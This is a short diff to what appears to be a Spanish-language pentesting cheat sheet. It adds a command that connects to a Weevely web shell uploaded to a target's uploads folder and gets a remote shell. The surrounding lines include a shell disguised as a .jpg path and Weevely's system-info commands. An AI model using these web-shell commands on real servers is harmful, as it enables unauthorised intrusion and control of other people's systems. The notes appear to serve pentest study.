@@ -124,6 +124,9 @@ La mayoría de las paginas al momento de comprometerlas encontraremos el usuario
 ❯ weevely https://IP/uploads/weevely.jpg/weevely.php password cmd   # Hara automaticamente una revershell con la peticion http request 
 	❯ :help                         # Muestra los comandos que podemos utilizar 
 	❯ :system_info                  # Muestra la info del sistema 
+
+❯ weevely https://IP/uploads/shell.php password           # Otra forma de conectarse a Weevely obteniendo la Revershell
+	❯ ls                            # Listamos el contenido 
 ```
 
 ## RCE en Web
